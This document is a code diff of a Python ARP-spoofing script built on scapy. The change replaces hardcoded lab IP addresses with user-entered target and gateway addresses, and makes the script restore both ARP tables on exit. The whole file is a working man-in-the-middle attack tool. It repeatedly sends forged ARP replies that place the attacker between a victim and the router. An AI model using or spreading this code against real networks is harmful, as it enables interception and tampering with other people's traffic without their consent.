@@ -1,7 +1,6 @@
 import scapy.all as scapy 
 import time
 
-
 def get_mac(ip):
     arp = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -21,20 +20,20 @@ def restore(dest_ip, source_ip):
     dest_mac=get_mac(dest_ip)
     source_mac=get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, verbose=False)
+    scapy.send(packet, count=4, verbose=False)
 
 
-#To forward the network packets from the victim machine through your machine and to the router use this command echo 1 > /proc/sys/net/ipv4/ip_forward
+target_ip=input("Enter the target IP address\n")
+gateway_ip=input("Enter the router IP address\n")
 send_packets = 0
 try:
     while True:
-        spoof("10.0.2.7", "10.0.2.1")
-        spoof("10.0.2.1", "10.0.2.7")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         send_packets = send_packets + 2 
         print("\r[+] Packets sent " + str(send_packets), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\nRestoring the ARP Tables of the target machine", end="")
-    restore("10.0.2.7", "10.0.2.1")
-    print("\nDetected CTRL + C.......Quitting!")
-
+    print("\nDetected CTRL + C.......Restoring ARP Tables & Quitting!")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip,target_ip)
